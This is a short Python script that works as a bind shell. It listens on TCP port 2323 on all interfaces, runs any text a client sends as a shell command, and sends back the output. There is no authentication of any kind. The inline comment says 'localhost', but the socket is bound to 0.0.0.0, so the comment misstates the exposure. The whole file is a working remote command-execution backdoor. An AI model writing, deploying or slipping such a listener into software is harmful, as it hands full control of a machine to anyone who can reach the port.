import socket
import subprocess
import os

def handle_client_connection(client_socket):
    while True:
        try:
            data = client_socket.recv(1024)
            if not data:
                break

            proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            client_socket.send(stdout_value)
        except Exception as e:
            print(f"Connection closed: {e}")
            break

    client_socket.close()

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', 2323)) # (localhost port 2323)
    server_socket.listen(5)
    print("Listening on port 2323...")

    while True:
        client_sock, address = server_socket.accept()
        print(f"Accepted connection from {address[0]}:{address[1]}")
        handle_client_connection(client_sock)

if __name__ == '__main__':
    main()

